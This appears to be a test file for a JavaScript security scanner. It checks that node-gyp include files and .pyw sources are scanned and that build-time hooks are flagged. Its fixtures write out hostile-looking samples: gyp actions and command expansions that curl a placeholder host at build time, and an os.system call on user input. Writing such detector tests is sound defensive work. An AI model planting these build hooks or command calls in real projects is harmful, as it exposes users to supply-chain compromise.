// Review: the walker never scanned .gyp / .gypi files other than
// binding.gyp, nor .pyw sources. node-gyp runs the actions and command
// expansions of every file a binding.gyp includes, and pythonw runs .pyw
// files: binding.gyp including build/common.gypi whose action curls
// 192.0.2.1, plus tool.pyw with os.system(user_cmd), scanned "0 files" and
// the gate PASSED. Every .gyp / .gypi now goes to scanGyp and .pyw is a
// Python source (twin of core.GYP_EXTS / core.EXTS). Inert content.

import { test } from "node:test";
import assert from "node:assert/strict";
import { mkdtempSync, mkdirSync, writeFileSync, readFileSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import { join, dirname } from "node:path";
import { run, collectFiles, detectLang, scanFile } from "../src/index.js";

const TREE = {
  "binding.gyp": "{\n  'includes': ['build/common.gypi'],\n  'targets': [{'target_name': 'addon', 'sources': ['addon.cc']}]\n}\n",
  "build/common.gypi": "{\n  'target_defaults': {\n    'actions': [{\n      'action_name': 'marker',\n"
    + "      'inputs': [], 'outputs': ['out.txt'],\n"
    + "      'action': ['sh', '-c', 'curl http://192.0.2.1/marker.txt -o out.txt'],\n    }],\n  },\n}\n",
  "tool.pyw": "import os\nos.system(user_cmd)  # marker\n",
};

function tree(files) {
  const d = mkdtempSync(join(tmpdir(), "lazaret-gyp-"));
  for (const [rel, data] of Object.entries(files)) {
    const p = join(d, ...rel.split("/"));
    mkdirSync(dirname(p), { recursive: true });
    writeFileSync(p, data);
  }
  return d;
}
const brief = (issues) => issues.map((i) => [i.rule, i.file.replaceAll("\\", "/"), i.sev]).sort();

test("gyp includes and .pyw sources are scanned; the gate fails", () => {
  const d = tree(TREE);
  try {
    const col = collectFiles(d);
    assert.deepEqual(col.files.map((f) => [f.path, f.lang]), [["tool.pyw", "py"]]);
    assert.deepEqual(col.manifests.map((m) => [m.kind, m.path.replaceAll("\\", "/")]).sort(),
      [["binding.gyp", "binding.gyp"], ["gyp", "build/common.gypi"]]);
    const err = [];
    const code = run(["check", d, "-q", "--no-html", "--ci"], { out: () => {}, err: (s) => err.push(s), env: {} });
    assert.equal(code, 1, err.join("\n"));                                  // was 0: "0 files", PASSED
    const report = JSON.parse(readFileSync(join(d, "lazaret-report.json"), "utf8"));
    assert.deepEqual(brief(report.issues), [["S-OSCMD-PY", "tool.pyw", "CRITICAL"],
      ["SC-INSTALL-HOOK", "build/common.gypi", "CRITICAL"]]);
    assert.equal(report.metrics.files, 1);
  } finally { rmSync(d, { recursive: true, force: true }); }
});

test("any .gyp / .gypi name, any case", () => {
  const d = tree({ "tools/gen.gyp": "{'variables': {'x': '<!(curl -s http://192.0.2.1/v)'}}\n",
    "deps/UPPER.GYPI": "{'targets': [{'actions': [{'action': ['python', 'gen.py']}]}]}\n", "a.py": "x = 1\n" });
  try {
    assert.equal(run(["check", d, "-q", "--no-html"], { out: () => {}, err: () => {}, env: {} }), 0);
    const report = JSON.parse(readFileSync(join(d, "lazaret-report.json"), "utf8"));
    assert.deepEqual(brief(report.issues), [["SC-INSTALL-HOOK", "deps/UPPER.GYPI", "MAJOR"],
      ["SC-INSTALL-HOOK", "tools/gen.gyp", "CRITICAL"]]);
  } finally { rmSync(d, { recursive: true, force: true }); }
});

test("a .pyw name is Python for the library API too (detectLang)", () => {
  const content = "import os\nos.system(user_cmd);\n";                  // a trailing ';' reads as JavaScript
  assert.equal(detectLang("tool.pyw", content), "py");
  assert.equal(detectLang("TOOL.PYW", content), "py");
  assert.deepEqual(scanFile({ name: "tool.pyw", content }).map((i) => i.rule), ["S-OSCMD-PY"]);
});
